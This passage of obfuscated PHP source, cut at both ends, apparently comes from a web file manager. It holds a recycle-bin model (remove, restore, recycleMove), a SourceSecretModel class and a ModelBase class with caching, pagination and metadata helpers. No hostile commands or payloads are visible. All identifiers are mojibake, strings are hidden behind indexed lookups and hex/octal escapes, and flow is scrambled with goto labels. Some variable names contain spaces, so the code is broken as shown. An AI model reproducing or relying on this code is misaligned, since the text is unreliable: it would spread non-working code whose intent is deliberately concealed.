$fŠ­¯ª•‹µ[$B¡¡¤®¨İæ[502]]); $this->add($d´Ò—àñÀõ); goto AÇÏÉ¶¸¹; F‘õİã±Ê‡: $B¡¡¤®¨İæ =& $_SERVER[ä°„ä°º]; $DÔÃÔ¡¨É… = Model($B¡¡¤®¨İæ[1227]); $fŠ­¯ª•‹µ = $DÔÃÔ¡¨É…->sourceInfo($eöáÚ«—); goto aªõçï¥ê; FÆ¢ ·ÈÍà: } public function clear() { $this->remove(!1); } public function remove($e›­ÜŒ‡Ø— = false, $C‰÷÷¥ù¬ = false) { goto E¾ù…—¤„¥; eò›Îˆßğù: $fšç¶ˆ°ÍÌ = $this->listData($C‰÷÷¥ù¬); $e›­ÜŒ‡Ø— = $e›­ÜŒ‡Ø— === !1 ? !1 : $e›­ÜŒ‡Ø—; $CâáÃ»ˆ¡Ï = array(); goto fÎ¥íöïÄ‡; fÎ¥íöïÄ‡: foreach ($fšç¶ˆ°ÍÌ as $C†ùÌİ¶ç) { if ($e›­ÜŒ‡Ø— != !1 && !in_array($C†ùÌİ¶ç, $e›­ÜŒ‡Ø—)) { continue; } $EòÎøÆˆğ = $A”ÁÖ……­¿->sourceInfo($C†ùÌİ¶ç); $A”ÁÖ……­¿->remove($C†ùÌİ¶ç, !1); $D°òç™Á¼Ü = $EòÎøÆˆğ[$CâŒÛ¾”¨[404]] . $CâŒÛ¾”¨[71] . $EòÎøÆˆğ[$CâŒÛ¾”¨[484]]; $CâáÃ»ˆ¡Ï[$D°òç™Á¼Ü] = array($CâŒÛ¾”¨[562] => $EòÎøÆˆğ[$CâŒÛ¾”¨[404]], $CâŒÛ¾”¨[484] => $EòÎøÆˆğ[$CâŒÛ¾”¨[484]]); $this->where(array($CâŒÛ¾”¨[395] => $C†ùÌİ¶ç))->delete(); } foreach ($CâáÃ»ˆ¡Ï as $b‹­éÓš¢Î) { $A”ÁÖ……­¿->targetSpaceUpdate($b‹­éÓš¢Î[$CâŒÛ¾”¨[404]], $b‹­éÓš¢Î[$CâŒÛ¾”¨[484]]); } goto C¬Õº‡±¹; E¾ù…—¤„¥: $CâŒÛ¾”¨ =& $_SERVER[ä°„ä°º]; $C‰÷÷¥ù¬ = $C‰÷÷¥ù¬ ? $C‰÷÷¥ù¬ : USER_ID; $A”ÁÖ……­¿ = Model($CâŒÛ¾”¨[1227]); goto eò›Îˆßğù; C¬Õº‡±¹: } public function restore($e”ˆ‚ôù§ = false) { $A¬÷ÅŠ…ó = $this->listData(); $this->_restoreSource($A¬÷ÅŠ…ó, $e”ˆ‚ôù§); } public function removeUserAll($d•»İªÔ¥Û) { $this->remove(!1, $d•»İªÔ¥Û); } private function _restoreSource($AùÊ¨Ğ¡¼, $E¨Å¿‡…µ•) { goto CçæÁ”éª£; CçæÁ”éª£: $aÊéš…Â§ï =& $_SERVER[ä°„ä°º]; $A²Ñ—Í¶Ë = Model($aÊéš…Â§ï[1227]); $E¨Å¿‡…µ• = $E¨Å¿‡…µ• == !1 ? !1 : $E¨Å¿‡…µ•; goto FÏ¦ÕÜ· ; d†¼æøè‰ù: $A²Ñ—Í¶Ë->updateModifyTime($d×ã¤«Òä…); goto D³Æ«ì”; FÏ¦ÕÜ· : if (!$AùÊ¨Ğ¡¼) { return !0; } $d×ã¤«Òä… = array(); foreach ($AùÊ¨Ğ¡¼ as $C‹Ù¤Šà³) { goto bğÙ¯‹Î°Ó; eäœëÈÊ…Å: if ($a‰ïÆéË…¾[$aÊéš…Â§ï[403]] == $aÊéš…Â§ï[87]) { $bà¤ÓÀÁ¶ = array($aÊéš…Â§ï[566] => array($aÊéš…Â§ï[525], $a‰ïÆéË…¾[$aÊéš…Â§ï[502]] . $C‹Ù¤Šà³ . $aÊéš…Â§ï[526])); $A²Ñ—Í¶Ë->where($bà¤ÓÀÁ¶)->setField($aÊéš…Â§ï[423], 0); $this->restoreFolderChildren($C‹Ù¤Šà³, $AùÊ¨Ğ¡¼); } $this->where(array($aÊéš…Â§ï[395] => $C‹Ù¤Šà³))->delete(); $A²Ñ—Í¶Ë->folderSizeReset($a‰ïÆéË…¾[$aÊéš…Â§ï[478]]); goto CÚƒªÇÅ•ê; bğÙ¯‹Î°Ó: if ($E¨Å¿‡…µ• != !1 && !in_array($C‹Ù¤Šà³, $E¨Å¿‡…µ•)) { continue; } $a‰ïÆéË…¾ = $A²Ñ—Í¶Ë->sourceInfo($C‹Ù¤Šà³); $CÊ†¾¥´é¨ = $A²Ñ—Í¶Ë->sourceInfo($a‰ïÆéË…¾[$aÊéš…Â§ï[478]]); goto a‚”¸äéô¹; a‚”¸äéô¹: if ($CÊ†¾¥´é¨[$aÊéš…Â§ï[423]] == $aÊéš…Â§ï[87]) { continue; } $A²Ñ—Í¶Ë->lockMoveStart($C‹Ù¤Šà³); $this->recycleMove($C‹Ù¤Šà³, 0); goto eäœëÈÊ…Å; CÚƒªÇÅ•ê: $d×ã¤«Òä…[] = $a‰ïÆéË…¾[$aÊéš…Â§ï[478]]; if ($a‰ïÆéË…¾[$aÊéš…Â§ï[403]] == $aÊéš…Â§ï[87]) { $d×ã¤«Òä…[] = $C‹Ù¤Šà³; } $A²Ñ—Í¶Ë->lockMoveEnd($C‹Ù¤Šà³); goto Fª¢·¢—Ğé; Fª¢·¢—Ğé: } goto d†¼æøè‰ù; D³Æ«ì”: } private function restoreFolderChildren($B¶°åÂàƒ, $c†Œ½©‹…) { goto c‹ÛÑÕÍ…ò; c‹ÛÑÕÍ…ò: $BíŠŒÁ’ =& $_SERVER[ä°„ä°º]; $EÜ„èÊ×× = Model($BíŠŒÁ’[1227]); $Cë†ŒêŞñ¶ = array($BíŠŒÁ’[395] => array($BíŠŒÁ’[7], array())); goto CãÁ¹”‘ô‹; E×Ô¥·°Í£: $Cë†ŒêŞñ¶[$BíŠŒÁ’[395]][1] = array_unique($Cë†ŒêŞñ¶[$BíŠŒÁ’[395]][1]); $Cë†ŒêŞñ¶[$BíŠŒÁ’[979]] = $BíŠŒÁ’[1807]; $EÜ„èÊ××->where($Cë†ŒêŞñ¶)->setField($BíŠŒÁ’[423], 1); goto BèÖ’³ù…; CãÁ¹”‘ô‹: foreach ($c†Œ½©‹… as $Dª¨¤»„«ë) { if ($Dª¨¤»„«ë == $B¶°åÂàƒ) { continue; } if (!$EÜ„èÊ××->isParentOf($B¶°åÂàƒ, $Dª¨¤»„«ë)) { continue; } $BÁ™àğà½ = $EÜ„èÊ××->sourceInfo($Dª¨¤»„«ë); if ($BÁ™àğà½[$BíŠŒÁ’[403]] == $BíŠŒÁ’[87]) { $Cë†ŒêŞñ¶[] = array($BíŠŒÁ’[566] => array($BíŠŒÁ’[525], $BÁ™àğà½[$BíŠŒÁ’[502]] . $Dª¨¤»„«ë . $BíŠŒÁ’[526])); } else { $Cë†ŒêŞñ¶[$BíŠŒÁ’[395]][1][] = $Dª¨¤»„«ë; } } if (!$Cë†ŒêŞñ¶[$BíŠŒÁ’[395]][1]) { unset($Cë†ŒêŞñ¶[$BíŠŒÁ’[395]]); } if (!$Cë†ŒêŞñ¶) { return; } goto E×Ô¥·°Í£; BèÖ’³ù…: } private function recycleMove($bùê‹ç¡¶È, $dœ«‹©•œ = 1) { $C™Ú“ç†©É =& $_SERVER[ä°„ä°º]; $d“¢ˆ•œ„¡ = Model($C™Ú“ç†©É[1227]); $eÕÉ‘†¯° = Model($C™Ú“ç†©É[2015]); $a¨îÁ„­Èö = array($C™Ú“ç†©É[395] => $bùê‹ç¡¶È); if ($dœ«‹©•œ) { $d“¢ˆ•œ„¡->where($a¨îÁ„­Èö)->setField($C™Ú“ç†©É[423], 1); $eÕÉ‘†¯°->eventRecycle($bùê‹ç¡¶È, $C™Ú“ç†©É[2016]); } else { $c–Åöõì‹ñ = $d“¢ˆ•œ„¡->where($a¨îÁ„­Èö)->find(); $aª‘ŞÜŸ„Š = $c–Åöõì‹ñ[$C™Ú“ç†©É[403]] == $C™Ú“ç†©É[87]; $dÒ¶êáÎÓ¿ = $d“¢ˆ•œ„¡->fileNameAuto($c–Åöõì‹ñ[$C™Ú“ç†©É[478]], $c–Åöõì‹ñ[$C™Ú“ç†©É[28]], REPEAT_RENAME_FOLDER, $aª‘ŞÜŸ„Š); if ($dÒ¶êáÎÓ¿ != $c–Åöõì‹ñ[$C™Ú“ç†©É[28]]) { $d“¢ˆ•œ„¡->rename($bùê‹ç¡¶È, $dÒ¶êáÎÓ¿); } $d“¢ˆ•œ„¡->where($a¨îÁ„­Èö)->setField($C™Ú“ç†©É[423], 0); $eÕÉ‘†¯°->eventRecycle($bùê‹ç¡¶È, $C™Ú“ç†©É[2017]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\163\157\x75\x72\143\145\123\x65\143\x72\x65\164\x4c\x69\x73\164"; public $field = array("\x73\157\x75\162\143\145\x49\x44", "\x74\x79\160\x65\111\104", "\143\162\x65\141\164\x65\125\163\145\162"); } goto Aõ«—¼«­„; bÛ´Èœçİ÷: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\x54\151\155\145", "\164\151\155\145", "\151\156\x73\145\162\164\54\165\160\144\141\164\x65", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\143\162\x65\141\164\145\124\151\x6d\145", "\164\151\155\145", "\x69\156\163\x65\162\x74", "\146\x75\156\x63\164\x69\x6f\156")); public function setDataAuto($bƒÀÁÓÄÍ‡) { $this->dataAuto = $bƒÀÁÓÄÍ‡; } public function __construct($C¬ŸºÃéšÔ = '', $E¹êÃ²É§  = '', $bÌöÊƒŠ¯ë = '') { parent::__construct($C¬ŸºÃéšÔ, $E¹êÃ²É§ , $bÌöÊƒŠ¯ë); } protected $tableMeta = array(); protected function _beforeInsert(&$BÅÀÒ× ”‹, $eãÁ’ÏƒÍŠ) { $Bˆƒ°Â÷àÃ =& $_SERVER[ä°„ä°º]; if (!$this->checkDataAutoHas($Bˆƒ°Â÷àÃ[353])) { return; } $this->dataBeforeFilter($BÅÀÒ× ”‹, $Bˆƒ°Â÷àÃ[353]); } protected function _beforeUpdate(&$c‰ˆÈ¯¡, $b¶ÆªËø»ê) { $cõÌ—¬Üìš =& $_SERVER[ä°„ä°º]; if (!$this->checkDataAutoHas($cõÌ—¬Üìš[354])) { return; } $this->dataBeforeFilter($c‰ˆÈ¯¡, $cõÌ—¬Üìš[354]); } protected function _afterSelect(&$A­­ÆË©“™, $bÕ‡—Èº) { if (!is_array($A­­ÆË©“™)) { return; } if (!$this->checkDataAutoHas($_SERVER[ä°„ä°º][355])) { return; } foreach ($A­­ÆË©“™ as &$dÈ„Ü›Ğ¼Ê) { $this->dataAfterFilter($dÈ„Ü›Ğ¼Ê); } unset($dÈ„Ü›Ğ¼Ê); } protected function _afterFind(&$D÷ó¤ÏÃ·ö, $EÓšŞ‹ßóÀ) { if (!is_array($D÷ó¤ÏÃ·ö)) { return; } if (!$this->checkDataAutoHas($_SERVER[ä°„ä°º][355])) { return; } $this->dataAfterFilter($D÷ó¤ÏÃ·ö); } public static function textEncode($BËĞÇ§ì¼¸) { if (!$BËĞÇ§ì¼¸) { return $BËĞÇ§ì¼¸; } $FÕŞ‡¡Ú = json_encode($BËĞÇ§ì¼¸); $FÕŞ‡¡Ú = preg_replace_callback($_SERVER[ä°„ä°º][356], function ($dù›ãƒ•²) { return addslashes($dù›ãƒ•²[0]); }, $FÕŞ‡¡Ú); return json_decode($FÕŞ‡¡Ú); } public static function textDecode($f¯£áÒª¯¹) { $AµÓ¼Ú˜±© =& $_SERVER[ä°„ä°º]; $e£ä‰‰ëİÑ = json_encode($f¯£áÒª¯¹); $e£ä‰‰ëİÑ = preg_replace_callback($AµÓ¼Ú˜±©[357], function ($F÷ç®¸¸ØÙ) { return $_SERVER[ä°„ä°º][97]; }, $e£ä‰‰ëİÑ); return json_decode($e£ä‰‰ëİÑ); } public function setAutoIncrement($DñÜÈ• ¾) { $B‚¶à¶† = array($this->getPk() => $DñÜÈ• ¾); $b“ÙğØò¯  = $this->data($B‚¶à¶†)->add(); if ($b“ÙğØò¯ ) { $this->delete($b“ÙğØò¯ ); } } public function getAutoIncrement() { $fî“Î”æòù = $this->getTableName(); $eã‚Ëñ¬¾ = $this->max($this->getPk()); $BÓ„ï‘÷Šò = $this->query("\163\150\157\x77\x20\164\141\142\x6c\145\x20\x73\x74\141\164\x75\x73\40\167\150\x65\x72\145\40\116\141\155\145\75\x27{$fî“Î”æòù}\47"); $FÈÎªİ®ô = $BÓ„ï‘÷Šò[0][$_SERVER[ä°„ä°º][358]]; $eÆÚòÒÄŠ = max($eã‚Ëñ¬¾, $FÈÎªİ®ô); return $eÆÚòÒÄŠ; } protected function _callBefore($Cß§¯¿ñö¸, $b¢àÊ–À”Û) { return $this->cacheCallCheck($Cß§¯¿ñö¸, $b¢àÊ–À”Û, !1); } protected function _callAfter($BÒŠˆ»Ù‚¦, $EÆÅ®’ä•¢) { return $this->cacheCallCheck($BÒŠˆ»Ù‚¦, $EÆÅ®’ä•¢, !0); } protected function cacheFunctionAlias($e¶Ê ‰«ëì) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($fî‹˜Œ‘„ë, $e‚´™éŸ, $CÆÂ–ÑŠŸÜ = false) { $DØ×«‘Ÿ—— = $this->cacheFunctionAlias($e‚´™éŸ); if (!$DØ×«‘Ÿ——) { return; } foreach ($DØ×«‘Ÿ—— as $d²ôÂ‡“Èğ => $d«³Ğ­ô†Õ) { $e³åõ¿Şçå = $d«³Ğ­ô†Õ[0]; $B‡Ïä ‹ÈŸ = explode($_SERVER[ä°„ä°º][47], $d«³Ğ­ô†Õ[1]); if ($fî‹˜Œ‘„ë == $d²ôÂ‡“Èğ) { return $this->cacheFunctionGet($d²ôÂ‡“Èğ, $e³åõ¿Şçå); } if ($CÆÂ–ÑŠŸÜ && in_array($fî‹˜Œ‘„ë, $B‡Ïä ‹ÈŸ)) { $this->cacheFunctionClear($d²ôÂ‡“Èğ, $e³åõ¿Şçå); } } } public function cacheFunctionGet($cÃ®í™Ô¨, $Fõ•È¡±è¶) { $Fêá Üé¨ˆ = $this->cacheKeyMake($cÃ®í™Ô¨, $Fõ•È¡±è¶); $E¬‰åóíĞÃ = Cache::get($Fêá Üé¨ˆ); if (!is_array($E¬‰åóíĞÃ)) { $E¬‰åóíĞÃ = call_user_func_array(array($this, $cÃ®í™Ô¨), array($Fõ•È¡±è¶, !0)); Cache::set($Fêá Üé¨ˆ, $E¬‰åóíĞÃ); } return $E¬‰åóíĞÃ; } public function cacheFunctionClear($EœóæÃÆŞ, $aœáÄê²‹„) { $eµøÄ™·®” = $aœáÄê²‹„; if (!is_array($aœáÄê²‹„)) { $eµøÄ™·®” = array($aœáÄê²‹„); } foreach ($eµøÄ™·®” as $Fâ“¢ÉÛ›ª) { $BÍÂ—Ç‹”« = $this->cacheKeyMake($EœóæÃÆŞ, $Fâ“¢ÉÛ›ª); Cache::remove($BÍÂ—Ç‹”«); } } private function cacheKeyMake($Eªõ¤Ì‰Û„, $aêÓê´ÒÙ) { $Cùô¼ÛÜÉ =& $_SERVER[ä°„ä°º]; return get_class($this) . $Cùô¼ÛÜÉ[71] . $Eªõ¤Ì‰Û„ . $Cùô¼ÛÜÉ[359] . $aêÓê´ÒÙ; } protected function selectPageReset() { $e‚ÕñØ…ñ¦ =& $_SERVER[ä°„ä°º]; if (isset($GLOBALS[$e‚ÕñØ…ñ¦[360]])) { return; } $GLOBALS[$e‚ÕñØ…ñ¦[360]] = isset($GLOBALS[$e‚ÕñØ…ñ¦[7]][$e‚ÕñØ…ñ¦[361]]) ? $GLOBALS[$e‚ÕñØ…ñ¦[7]][$e‚ÕñØ…ñ¦[361]] : !1; $GLOBALS[$e‚ÕñØ…ñ¦[362]] = isset($GLOBALS[$e‚ÕñØ…ñ¦[7]][$e‚ÕñØ…ñ¦[351]]) ? $GLOBALS[$e‚ÕñØ…ñ¦[7]][$e‚ÕñØ…ñ¦[351]] : !1; $GLOBALS[$e‚ÕñØ…ñ¦[7]][$e‚ÕñØ…ñ¦[361]] = !1; $GLOBALS[$e‚ÕñØ…ñ¦[7]][$e‚ÕñØ…ñ¦[351]] = !1; } protected function selectPageRestore() { $d‚‡ ¤¦ˆô =& $_SERVER[ä°„ä°º]; if (!isset($GLOBALS[$d‚‡ ¤¦ˆô[360]])) { return; } $GLOBALS[$d‚‡ ¤¦ˆô[7]][$d‚‡ ¤¦ˆô[361]] = $GLOBALS[$d‚‡ ¤¦ˆô[360]]; $GLOBALS[$d‚‡ ¤¦ˆô[7]][$d‚‡ ¤¦ˆô[351]] = $GLOBALS[$d‚‡ ¤¦ˆô[362]]; unset($GLOBALS[$d‚‡ ¤¦ˆô[360]]); unset($GLOBALS[$d‚‡ ¤¦ˆô[362]]); } protected function selectPage($Dì¡÷¤´©• = 200, $FÅˆ»Îß = 1) { goto eìÜ§¹Ÿ¸¬; d±İ§•²®: if (!is_array($b‰ÑŞ‚Å‡)) { $b‰ÑŞ‚Å‡ = array(); } if ($cß—Ùœ´Âµ == 1) { $A¸ê™ŒŒÄ® = count($b‰ÑŞ‚Å‡); } $C°‡£ùª× = array($B“‘Ì®óèî[364] => array($B“‘Ì®óèî[365] => $A¸ê™ŒŒÄ®, $B“‘Ì®óèî[361] => $Dì¡÷¤´©•, $B“‘Ì®óèî[351] => $FÅˆ»Îß, $B“‘Ì®óèî[366] => $cß—Ùœ´Âµ), $B“‘Ì®óèî[367] => $b‰ÑŞ‚Å‡); goto F‰ñ®ºè; D½ÆÁÑè™Ê: $c©ÑƒËÕ‚æ = 50000; $Dì¡÷¤´©• = isset($in[$B“‘Ì®óèî[361]]) && $in[$B“‘Ì®óèî[361]] ? $in[$B“‘Ì®óèî[361]] : $Dì¡÷¤´©•; if ($Dì¡÷¤´©• === -1) { $in[$B“‘Ì®óèî[361]] = !1; $c©ÑƒËÕ‚æ = 100000000; $Dì¡÷¤´©• = $c©ÑƒËÕ‚æ; } goto eÀæ‘Ñæ÷’; eÀæ‘Ñæ÷’: $eÅ¢­ïÈĞ = $dÉ´„º˜“³; $eÅ¢­ïÈĞ[$B“‘Ì®óèî[363]] = array(); $Dì¡÷¤´©• = intval($Dì¡÷¤´©•); goto cƒ¦ğ¯»¦œ; F‰ñ®ºè: return $C°‡£ùª×; goto a¶Ï¾‚Ô‡â; eìÜ§¹Ÿ¸¬: $B“‘Ì®óèî =& $_SERVER[ä°„ä°º]; global $in; $dÉ´„º˜“³ = $this->optionsValue(); goto D½ÆÁÑè™Ê; cÌàÊ¾šİ: $b‰ÑŞ‚Å‡ = array(); $d„Ä»Æ“¸Ì = 1; if ($FÅˆ»Îß == 1 && $d„Ä»Æ“¸Ì) { $this->optionsValue($dÉ´„º˜“³); $b‰ÑŞ‚Å‡ = $this->page($FÅˆ»Îß, $Dì¡÷¤´©•)->select(); $A¸ê™ŒŒÄ® = is_array($b‰ÑŞ‚Å‡) ? count($b‰ÑŞ‚Å‡) : 0; if ($A¸ê™ŒŒÄ® < $Dì¡÷¤´©•) { $cß—Ùœ´Âµ = 1; } else { $this->optionsValue($eÅ¢­ïÈĞ); $A¸ê™ŒŒÄ® = intval($this->count()); $cß—Ùœ´Âµ = ceil($A¸ê™ŒŒÄ® / $Dì¡÷¤´©•); } } else { $this->optionsValue($eÅ¢­ïÈĞ); $A¸ê™ŒŒÄ® = intval($this->count()); $cß—Ùœ´Âµ = ceil($A¸ê™ŒŒÄ® / $Dì¡÷¤´©•); $FÅˆ»Îß = $FÅˆ»Îß >= $cß—Ùœ´Âµ ? $cß—Ùœ´Âµ : $FÅˆ»Îß; $this->optionsValue($dÉ´„º˜“³); $b‰ÑŞ‚Å‡ = $this->page($FÅˆ»Îß, $Dì¡÷¤´©•)->select(); } goto d±İ§•²®; cƒ¦ğ¯»¦œ: $Dì¡÷¤´©• = $Dì¡÷¤´©• <= 5 ? 5 : ($Dì¡÷¤´©• >= $c©ÑƒËÕ‚æ ? $c©ÑƒËÕ‚æ : $Dì¡÷¤´©•); $FÅˆ»Îß = intval(isset($in[$B“‘Ì®óèî[351]]) && $in[$B“‘Ì®óèî[351]] ? $in[$B“‘Ì®óèî[351]] : $FÅˆ»Îß); $FÅˆ»Îß = $FÅˆ»Îß <= 1 ? 1 : $FÅˆ»Îß; goto cÌàÊ¾šİ; a¶Ï¾‚Ô‡â: } protected function checkLength($Aİî–ÛâÄ, $eõÀÁ÷‚Ñø = 0, $BÜ¡Áè×Ù = '') { $f³ù—š•² =& $_SERVER[ä°„ä°º]; $eõÀÁ÷‚Ñø = $eõÀÁ÷‚Ñø ? $eõÀÁ÷‚Ñø : 65536; if (!$Aİî–ÛâÄ || strlen($Aİî–ÛâÄ) < $eõÀÁ÷‚Ñø) { return; } $BÜ¡Áè×Ù = $BÜ¡Áè×Ù ? $BÜ¡Áè×Ù . $f³ù—š•²[68] : $f³ù—š•²[33]; show_json($BÜ¡Áè×Ù . LNG($f³ù—š•²[368]) . "\x28{$eõÀÁ÷‚Ñø}\x29", !1); } protected function metaSet($A‘­Üœ‚“, $CÉ–ƒĞ×¢š = null, $F’²ÊªÉï÷ = null) { goto fÕ“­ñâŒğ; D«ƒéÒ—è: if (is_null($CÉ–ƒĞ×¢š)) { return $e„Ûà¥â©¬->where(array($BìÙà¾·‚Œ => $A‘­Üœ‚“))->delete(); } if (is_null($F’²ÊªÉï÷) && is_string($CÉ–ƒĞ×¢š)) { return $e„Ûà¥â©¬->where($dôëÆ¸¿ÃÚ)->delete(); } $C¤ôÉÚÇ”á = is_array($CÉ–ƒĞ×¢š) ? $CÉ–ƒĞ×¢š : array(); goto e·ˆØŠ¢èÛ; F§¥¿º„˜‰: $bŒÚ÷ÍËé = $B£Ö£²¶¾ˆ[373] . $this->tableMeta; CacheLock::lock($bŒÚ÷ÍËé); $e„Ûà¥â©¬->where(array($BìÙà¾·‚Œ => $A‘­Üœ‚“))->addAll($F…£¸›Ú‰, array(), !0); goto cãÆ´Úïë×; e·ˆØŠ¢èÛ: if (is_string($CÉ–ƒĞ×¢š)) { $C¤ôÉÚÇ”á[$CÉ–ƒĞ×¢š] = $F’²ÊªÉï÷; } $F…£¸›Ú‰ = array(); foreach ($C¤ôÉÚÇ”á as $fƒÓ¿õ˜Ò => $c¸‰ğÄÒè) { $this->checkLength($c¸‰ğÄÒè, !1, $C´Æì§Šß‰ . $B£Ö£²¶¾ˆ[4] . $fƒÓ¿õ˜Ò); $F…£¸›Ú‰[] = array($BìÙà¾·‚Œ => $A‘­Üœ‚“, $B£Ö£²¶¾ˆ[93] => $fƒÓ¿õ˜Ò, $B£Ö£²¶¾ˆ[372] => $c¸‰ğÄÒè); } goto F§¥¿º„˜‰; fÕ“­ñâŒğ: $B£Ö£²¶¾ˆ =& $_SERVER[ä°„ä°º]; if (!$this->tableMeta || !$A‘­Üœ‚“) { return !1; } $BìÙà¾·‚Œ = $this->tableMeta[$B£Ö£²¶¾ˆ[369]]; goto aÔÈ…¾ŠœÌ; aÔÈ…¾ŠœÌ: $C´Æì§Šß‰ = $this->tableMeta[$B£Ö£²¶¾ˆ[370]]; $e„Ûà¥â©¬ = Model($C´Æì§Šß‰); $dôëÆ¸¿ÃÚ = array($BìÙà¾·‚Œ => $A‘­Üœ‚“, $B£Ö£²¶¾ˆ[371] => $CÉ–ƒĞ×¢š); goto D«ƒéÒ—è; cãÆ´Úïë×: CacheLock::unlock($bŒÚ÷ÍËé); return !0; goto cùï§„¤š×; cùï§„¤š×: } public function metaGet($A Ö¹Ó²‰, $d‡ÒÙÌÏÂâ = false) { goto B²©î¸¯ÛÉ; B˜ÂŸ½äŠ: $e³èÁ­Ã = $cî‰¾Ûàòâ->field($e‹Îˆˆ£¢[374])->where($c‘ä§…Ñ–)->select(); $e³èÁ­Ã = array_to_keyvalue($e³èÁ­Ã, $e‹Îˆˆ£¢[93], $e‹Îˆˆ£¢[372]); return $e³èÁ­Ã; goto e°ƒáù´Çå; B²©î¸¯ÛÉ: $e‹Îˆˆ£¢ =& $_SERVER[ä°„ä°º]; if (!$this->tableMeta) { return array(); } $F¯ öÙ· = $this->tableMeta[$e‹Îˆˆ£¢[369]]; goto E­ôç«±ù; E­ôç«±ù: $cî‰¾Ûàòâ = Model($this->tableMeta[$e‹Îˆˆ£¢[370]]); if ($d‡ÒÙÌÏÂâ) { $c‘ä§…Ñ– = array($F¯ öÙ· => $A Ö¹Ó²‰, $e‹Îˆˆ£¢[93] => $d‡ÒÙÌÏÂâ); return $cî‰¾Ûàòâ->where($c‘ä§…Ñ–)->getField($e‹Îˆˆ£¢[372]); } $c‘ä§…Ñ– = array($F¯ öÙ· => $A Ö¹Ó²‰); goto B˜ÂŸ½äŠ; e°ƒáù´Çå: } private function checkDataAutoHas($bø¨Ìàµåå) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $dî†Ïš†¿) { if (in_array($bø¨Ìàµåå, explode($_SERVER[ä°„ä°º][47], $dî†Ïš†¿[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$e¹ÅÍ•Ó˜Œ, $eÄ¼öÜó÷ù) { $b±´«³’ğ =& $_SERVER[ä°„ä°º]; foreach ($this->dataAuto as $F»Õª²«Ò‡) { $F‡¶°Ó’Ç¾ = $F»Õª²«Ò‡[0]; if (!in_array($eÄ¼öÜó÷ù, explode($b±´«³’ğ[47], $F»Õª²«Ò‡[2]))) { continue; } switch (trim($F»Õª²«Ò‡[3])) { case $b±´«³’ğ[319]: case $b±´«³’ğ[320]: $FƒÃ¦Ğ†‘ = $F»Õª²«Ò‡[1]; $cîÉÀ¼µ˜ö = isset($F»Õª²«Ò‡[4]) ? (array) $F»Õª²«Ò‡[4] : array(); if ($FƒÃ¦Ğ†‘ == $b±´«³’ğ[197] && array_key_exists($F‡¶°Ó’Ç¾, $e¹ÅÍ•Ó˜Œ)) { if (!$e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾]) { unset($e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾]); } break; } if (isset($e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾])) { array_unshift($cîÉÀ¼µ˜ö, $e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾]); } if ($b±´«³’ğ[319] == $F»Õª²«Ò‡[3]) { $e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾] = call_user_func_array($FƒÃ¦Ğ†‘, $cîÉÀ¼µ˜ö); } else { $e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾] = call_user_func_array(array(&$this, $FƒÃ¦Ğ†‘), $cîÉÀ¼µ˜ö); } break; case $b±´«³’ğ[271]: $e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾] = $e¹ÅÍ•Ó˜Œ[$F»Õª²«Ò‡[1]]; break; case $b±´«³’ğ[292]: if (isset($e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾]) && !is_string($e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾])) { $e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾] = json_encode_force($e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾]); } break; case $b±´«³’ğ[321]: if ($e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾] === $b±´«³’ğ[33]) { unset($e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾]); } break; case $b±´«³’ğ[322]: $e¹ÅÍ•Ó˜Œ[$F‡¶°Ó’Ç¾] = $F»Õª²«Ò‡[1]; default: break; } } if ($eÄ¼öÜó÷ù == $b±´«³’ğ[353]) { $d¾Ë×İ±±í = strtolower($this->db->getDbType()); if (strpos($d¾Ë×İ±±í, $b±´«³’ğ[9]) !== 0) { return; } $BÄôÅé˜› = $this->field(!0)->fields; $d´÷–áŠ™ = $BÄôÅé˜›[$b±´«³’ğ[250]]; if (isset($BÄôÅé˜›[$b±´«³’ğ[249]])) { unset($d´÷–áŠ™[$BÄôÅé˜›[$b±´«³’ğ[249]]]); } foreach ($d´÷–áŠ™ as $c«ÖŞÖÚµ¿ => $eÄ¼öÜó÷ù) { if (!isset($e¹ÅÍ•Ó˜Œ[$c«ÖŞÖÚµ¿])) { $e¹ÅÍ•Ó˜Œ[$c«ÖŞÖÚµ¿] = $b±´«³’ğ[33]; } } } } private function dataAfterFilter(&$CŠ– ²Ãœˆ) { $Cô›‚ôïµá =& $_SERVER[ä°„ä°º]; foreach ($this->dataAuto as $DÚœ£‰İ±—) { $DÜÉä‡Ü®™ = $DÚœ£‰İ±—[0]; if (!in_array($Cô›‚ôïµá[355], explode($Cô›‚ôïµá[47], $DÚœ£‰İ±—[2]))) { continue; } if (!isset($CŠ– ²Ãœˆ[$DÜÉä‡Ü®™])) { continue; } switch (trim($DÚœ£‰İ±—[3])) { case $Cô›‚ôïµá[319]: case $Cô›‚ôïµá[320]: $A±æ¡êŒÇ• = isset($DÚœ£‰İ±—[4]) ? (array) $DÚœ£‰İ±—[4] : array(); array_unshift($A±æ¡êŒÇ•, $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™]); if ($Cô›‚ôïµá[319] == $DÚœ£‰İ±—[3]) { $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™] = call_user_func_array($DÚœ£‰İ±—[1], $A±æ¡êŒÇ•); } else { $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™] = call_user_func_array(array(&$this, $DÚœ£‰İ±—[1]), $A±æ¡êŒÇ•); } break; case $Cô›‚ôïµá[271]: $CŠ– ²Ãœˆ[$DÜÉä‡Ü®™] = $CŠ– 